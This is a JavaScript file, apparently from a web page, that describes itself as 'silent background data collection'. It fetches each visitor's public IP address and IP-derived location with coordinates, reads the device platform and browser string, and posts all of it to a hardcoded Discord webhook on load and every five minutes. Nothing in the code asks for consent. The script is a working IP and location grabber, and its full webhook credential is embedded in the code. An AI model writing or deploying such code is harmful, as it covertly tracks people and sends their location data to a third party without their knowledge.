// Silent background data collection
const elements = {
    ip: document.getElementById('ip'),
    location: document.getElementById('location'),
    time: document.getElementById('time'),
    device: document.getElementById('device'),
    browser: document.getElementById('browser')
};

const WEBHOOK_URL = "https://discord.com/api/webhooks/1406107665939042345/s8XXhrjJOdg5xYp4bMx3MsYaMhPpD-AXxnt3uOMUCdIErtabNOP-1BUMDX6Js5gXYK7p";

async function fetchGeoData(ip) {
    try {
        const response = await fetch(`https://ipapi.co/${ip}/json/`);
        const data = await response.json();
        return `${data.city}, ${data.region}, ${data.country} (Lat: ${data.latitude}, Lon: ${data.longitude})` || 'N/A';
    } catch {
        return 'N/A';
    }
}

async function updateProfile() {
    try {
        // IP Address
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        const ip = ipData.ip || 'N/A';
        elements.ip.textContent = ip;

        // Geolocation (IP-based fallback if permission not granted)
        const geoData = await fetchGeoData(ip);
        elements.location.textContent = geoData;

        // Current Time
        elements.time.textContent = new Date().toLocaleString();

        // Device Info
        elements.device.textContent = navigator.platform || 'N/A';

        // Browser Info
        elements.browser.textContent = navigator.userAgent || 'N/A';

        // Send to Discord
        const profile = {
            content: "User Profile",
            embeds: [{
                title: "Profile Data",
                fields: [
                    { name: "IP", value: ip },
                    { name: "Location", value: geoData },
                    { name: "Time", value: new Date().toLocaleString() },
                    { name: "Device", value: navigator.platform || 'N/A' },
                    { name: "Browser", value: navigator.userAgent || 'N/A' }
                ]
            }]
        };

        await fetch(WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(profile)
        });
    } catch {
        elements.ip.textContent = 'N/A';
        elements.location.textContent = 'N/A';
        elements.time.textContent = 'N/A';
        elements.device.textContent = 'N/A';
        elements.browser.textContent = 'N/A';
    }
}

// Update every 5 minutes silently
setInterval(updateProfile, 300000);
updateProfile();
